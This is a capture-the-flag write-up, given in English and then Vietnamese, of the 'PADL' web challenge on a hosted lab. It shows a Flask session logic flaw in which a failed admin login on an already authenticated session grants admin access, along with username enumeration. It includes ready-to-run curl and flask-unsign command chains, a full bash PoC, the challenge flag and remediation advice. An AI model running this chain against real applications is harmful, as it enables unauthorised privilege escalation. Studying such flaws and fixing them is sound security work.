# Quick Sum

no /robots.txt, /sitemap.xml

no routes: /admin, /settings, …

cookies signed by flask itsdangerous, lets use flask-unsign -> `{'authenticated': True, 'user_id': 'uid=player1,ou=users,dc=padl,dc=local', 'username': 'player1'}`

bruteforce wordlist rockyou.txt to find the secret_key failed 

EXPLORE #1: username enumeration due to error leak in login -> confirm admin account

EXPLORE #2: admin invalid password BUT STILL SET-COOKIE, unsign -> `{'user_id': 'uid=admin,ou=users,dc=padl,dc=local', 'username': 'admin'}`

⇒ WE NEED TO CRAFT `{'authenticated': True, 'user_id': 'uid=admin,ou=users,dc=padl,dc=local', 'username': 'admin'}` -> ez win

<img width="1849" height="1079" alt="image" src="https://github.com/user-attachments/assets/5c48c44d-0e65-436c-8a11-ace6fd601493" />

<img width="1852" height="1037" alt="image" src="https://github.com/user-attachments/assets/9852cb43-6b25-44b2-a844-784c1a9ad761" />


# Writeup — PADL (unknown)

## Metadata

- Challenge: PADL
- Author: unknown
- Category: Web
- Difficulty: Medium
- Event: PoC/Practice (hosted lab)
- Solver: foqs
- Analyst: Aurelinth
- Target: [http://bglsc2fkzm9xcw-0.playat.flagyard.com](http://bglsc2fkzm9xcw-0.playat.flagyard.com/) (web entrypoints: `/`, `/dashboard`, `/bookings`)
- Date: 2025-10-12

---

## Executive summary

A logic flaw in the authentication flow allowed session fixation / session manipulation. The application wrote the `user_id` (LDAP DN) into the session before verifying the password on login attempts; separately, a successful login created an authenticated session. By first obtaining an authenticated session for a low-privilege user (player1) and then performing an *unsuccessful* login attempt for `admin` using the existing cookie, the session became both authenticated and associated with the `admin` user. This directly led to an immediate privilege escalation: the attacker accessed the admin dashboard and retrieved the flag.

---

## Scope & preconditions

- In-scope: the web host and all endpoints reachable from the web UI (`/`, `/dashboard`, `/bookings`).
- Credentials used in testing: `player1 / password123` (provided by the challenge). The `admin` username existed and login attempts with wrong password produced a session containing the `admin` DN.
- Lab restriction: testing performed in the organizer-provided CTF environment.

---

## Recon / initial observations

- Observed login page at `/` which POSTs `username` and `password` (FormData) to `/login` or `/` depending on UI.
- Successful login with `player1/password123` returns JSON `{"success":true,...}` and sets a Flask-signed session cookie (URL-safe itsdangerous format starting with `.eJ...`).
- Failed login attempts produced different visible messages: `username notfound` vs `invalid password` (user enumeration). More importantly, a failed login for `admin` still set a session cookie whose payload contained `{'user_id':'uid=admin,ou=users,dc=padl,dc=local','username':'admin'}`.
- Tools used: `curl`, `flask-unsign` (to decode session payload locally), simple bash scripts for chaining requests.

Quick commands used for reconnaissance

```bash
# login and save cookie
curl -k -c cj_player1.txt -X POST 'http://HOST/login' -F 'username=player1' -F 'password=password123' -i

# decode session payload (no secret needed)
flask-unsign --decode --cookie '<SESSION_COOKIE_VALUE>'

```

---

## Vulnerability 1 — Authentication logic / session fixation (Severity: High)

**Description:** the application stores `user_id` and `username` into the session during login attempts *before* validating credentials, and it does not properly re-initialize or sanitize the session on subsequent login attempts.

**Root cause:** session management sequence is incorrect. The code updates session fields based on submitted username prior to password verification and fails to reset the session state (or generate a fresh session) when login attempts fail or when handling a new auth event.

**Reproduction / PoC:** exact steps used in lab

1. Obtain an authenticated session as `player1`:

```bash
curl -k -c cj_player1.txt -X POST 'http://HOST/login' -F 'username=player1' -F 'password=password123' -i
SESSION=$(awk '/\tsession\t/ {print $7}' cj_player1.txt | tail -n1)
flask-unsign --decode --cookie "$SESSION"
# => {'authenticated': True, 'user_id': 'uid=player1,...', 'username': 'player1'}

```

1. Using the same cookie file (so same session), perform a failed login for `admin`:

```bash
# reuse cj_player1.txt as both -b and -c
curl -k -b cj_player1.txt -c cj_player1.txt -X POST 'http://HOST/login' -F 'username=admin' -F 'password=wrong' -i

```

1. Decode the session newly set in `cj_player1.txt`:

```bash
SESSION=$(awk '/\tsession\t/ {print $7}' cj_player1.txt | tail -n1)
flask-unsign --decode --cookie "$SESSION"
# => {'authenticated': True, 'user_id': 'uid=admin,ou=users,dc=padl,dc=local', 'username': 'admin'}

```

1. Use the same cookie to access the admin dashboard:

```bash
curl -k -b cj_player1.txt 'http://HOST/dashboard' -i

```

**Impact:** attacker can escalate privileges to admin without knowing admin password, view sensitive admin-only pages, modify bookings, and read any flag placed in the admin UI.

---

## Vulnerability 2 — User enumeration (Severity: Medium)

**Description:** login responses differ between unknown usernames and incorrect passwords, enabling enumeration of valid usernames.

**Root cause:** distinct error messages returned from the auth endpoint reveal whether an account exists.

**Reproduction / PoC:** send two login requests with the same structure but use a nonexistent username and a known username with wrong password; observe differing responses.

**Impact:** enumeration reduces brute-force space and supports targeted attacks (e.g. the session fixation exploit above specifically targeted the `admin` username).

---

## Exploitation — full chain (step-by-step)

1. Step 1 — authenticate as low-privilege user (player1)

```bash
curl -k -c cj_player1.txt -X POST 'http://HOST/login' -F 'username=player1' -F 'password=password123' -i

```

Expected result: server returns success JSON and sets a `session` cookie whose decoded payload contains `authenticated: True`.

1. Step 2 — with the same cookie, initiate a login attempt for `admin` that will fail (wrong password)

```bash
curl -k -b cj_player1.txt -c cj_player1.txt -X POST 'http://HOST/login' -F 'username=admin' -F 'password=wrong' -i

```

Expected result: the login handler sets `user_id`/`username` into the session but does not clear `authenticated` flag.

1. Step 3 — decode session to confirm escalation

```bash
SESSION=$(awk '/\tsession\t/ {print $7}' cj_player1.txt | tail -n1)
flask-unsign --decode --cookie "$SESSION"
# Expect: {'authenticated': True, 'user_id': 'uid=admin,...', 'username': 'admin'}

```

1. Step 4 — access admin dashboard and extract flag

```bash
curl -k -b cj_player1.txt 'http://HOST/dashboard' -i
# or request likely flag pages (/flag, /admin/flag, etc.)

```

Expected result: admin dashboard accessible; flag visible in admin UI.

**Exact outputs observed in lab:** using the chained flow above, the admin dashboard rendered and exposed the flag (displayed in the UI). The retrieved flag was:

`FlagY{90130dd97044ca3c05eba937780d0035}`

(artifact: screenshot captured of the admin dashboard showing the flag.)

---

## Artifacts

- Flag: `FlagY{90130dd97044ca3c05eba937780d0035}`
- PoC commands: curl sequences above (login as player1, reuse cookie, then failed admin login, then access dashboard).
- Evidence: session decoding outputs showing `authenticated: True` and `user_id` set to admin after the chain.

---

## Remediation recommendations

**Quick fixes (priority):**

1. **Do not modify session with identity data before authentication completes.** Only set identity attributes into session after successful credential verification.
2. **Recreate the session on privilege transitions.** After successful login (or logout), issue a fresh session id (cookie) rather than reusing the existing session; e.g., `session.clear()` then set new values or use framework helpers to regenerate session.
3. **Do not leak existence of usernames.** Return generic authentication error messages such as "invalid credentials" for all failures.

**Deep fixes / hardening:**

- Implement server-side checks for all privileged actions (do not rely only on session content sent by the client).
- Introduce secure session handling patterns: rotate session identifiers on login, enforce HttpOnly and Secure flags (already HttpOnly present; ensure Secure when using HTTPS), set `SameSite` attribute appropriately.
- Add rate-limiting and account lockout policies for repeated failed attempts (with caution in CTF / dev environments).

**Detection / monitoring:**

- Log unusual sequences of events: session authenticated then username changed in same session; multiple failed logins reusing same session cookie.
- Generate alerts for login attempts that modify session identity without a full re-authentication (and for failed login followed by immediate admin resource access).

---

## Timeline & disclosure

- Discovered: 2025-10-12 (during CTF lab playthrough).
- Organizer notified: N/A (lab environment) — if this were production, disclose to application owner immediately and provide proof-of-concept.
- Patch status: not applicable in lab; remediation steps provided above.

---

## Appendix

### Full PoC script (bash)

```bash
# 1) Login as player1 and save cookie
curl -k -c cj_player1.txt -X POST 'http://HOST/login' -F 'username=player1' -F 'password=password123' -i

# 2) Reuse the same cookie to perform a failed admin login
curl -k -b cj_player1.txt -c cj_player1.txt -X POST 'http://HOST/login' -F 'username=admin' -F 'password=wrong' -i

# 3) Confirm escalation and view dashboard
curl -k -b cj_player1.txt 'http://HOST/dashboard' -i | sed -n '1,200p'

# 4) decode session payload locally (optional)
SESSION=$(awk '/\tsession\t/ {print $7}' cj_player1.txt | tail -n1)
flask-unsign --decode --cookie "$SESSION"

```

### Helpful references

- Flask session management and `itsdangerous` documentation
- OWASP: Session Management Cheat Sheet
- OWASP: Authentication Cheat Sheet

---

# Writeup — PADL (unknown)

## Thông tin chung

- Challenge: PADL
- Tác giả: không rõ
- Loại: Web (Authentication/Session logic)
- Độ khó: Trung bình
- Sự kiện: PoC/Practice lab
- Người giải: lilsadfoqs
- Phân tích: Aurelinth
- Mục tiêu: [http://bglsc2fkzm9xcw-0.playat.flagyard.com](http://bglsc2fkzm9xcw-0.playat.flagyard.com/) (`/`, `/dashboard`, `/bookings`)
- Ngày: 2025-10-12

---

## Tóm tắt ngắn

Ứng dụng viết `user_id` (LDAP DN) vào session trước khi xác thực password, và không tái khởi tạo phiên làm việc khi xảy ra sự kiện đăng nhập. Kết hợp với việc trả lời khác nhau cho `username notfound` và `invalid password`, ta thực hiện chuỗi: có được session đã xác thực cho `player1`, rồi thực hiện một login sai với `admin` dùng cùng session — dẫn tới session vừa `authenticated: True` vừa `user_id=admin` → leo quyền ngang. Sau đó truy cập dashboard admin và lấy flag.

---

## Phạm vi & điều kiện tiền đề

- Phạm vi: host web, các route giao diện `/`, `/dashboard`, `/bookings`.
- Credentials: `player1/password123`.
- Hạn chế: thử nghiệm trong lab được phép.

---

## Recon / quan sát ban đầu

- Login flow là POST form-data, phản hồi JSON. Session cookie là Flask-signed cookie (`.eJ...`).
- Failed login cho `admin` vẫn tạo session có `user_id` = `uid=admin,...`.
- Kiểm tra nội dung session bằng `flask-unsign --decode`.

Các lệnh reconnaissance chính:

```bash
curl -k -c cj_player1.txt -X POST 'http://HOST/login' -F 'username=player1' -F 'password=password123' -i
flask-unsign --decode --cookie '<SESSION_COOKIE_VALUE>'

```

---

## Lỗ hổng 1 — Authentication logic / session fixation (Mức độ: Cao)

**Mô tả:** ứng dụng gán danh tính (user_id) vào session trước khi xác thực, và không tái khởi tạo session khi xử lý các event auth.

**Nguyên nhân gốc rễ:** do thứ tự xử lý trong handler login; session không cleared/regenerate.

**PoC / Reproduce:** xem phần "Exploitation — full chain" phía trên.

**Tác hại:** leo quyền, truy cập trang admin, thay đổi booking và thu flag.

---

## Chain exploit — chi tiết từng bước

1. Bước 1 — login thành công `player1/password123` (lấy session đã authenticated).
2. Bước 2 — dùng chính session đó gửi request login sai cho username `admin` → handler viết `user_id=admin` vào session mà không xóa `authenticated`.
3. Bước 3 — truy cập `/dashboard` hoặc các endpoint admin, đọc flag.
    
    Kèm payload và lệnh curl chính xác đã dùng ở phần Appendix.
    

---

## Bằng chứng & artifacts

- Flag: `FlagY{90130dd97044ca3c05eba937780d0035}` (hiển thị rõ trên admin dashboard).
- File/Script: PoC bash script (xem Appendix).
- Decoded session snapshots: outputs của `flask-unsign --decode` trước và sau exploit showing `authenticated: True` then `user_id=admin`.

---

## Khuyến nghị sửa chữa

- Không set identity vào session trước khi authentication thành công.
- Regenerate session cookie on login/logout and clear existing session data.
- Trả lỗi chung cho thất bại auth ("invalid credentials") để ngăn user enumeration.
- Thêm server-side authorization checks for all privileged actions.

---

## Timeline & disclosure

- Phát hiện: 2025-10-12 trong lab.
- Đã cung cấp remediation trong phần trên.

---

## Phụ lục

- Full PoC scripts (xem Appendix trên).
- Tài liệu tham khảo: Flask & itsdangerous docs, OWASP session/authentication guides.
